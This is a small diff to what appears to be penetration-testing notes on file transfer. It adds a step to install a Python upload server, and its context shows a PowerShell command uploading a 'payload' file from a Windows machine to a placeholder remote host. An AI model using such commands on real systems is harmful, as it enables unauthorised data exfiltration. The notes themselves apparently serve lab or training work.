@@ -115,3 +115,7 @@ upload
 Invoke-FileUpload -Uri http:10.10.10.10:0000/upload -File C:\Users\Public\payload
 ```
 
+- Upload server again 
+```bash 
+pip install uploadserver 
+```
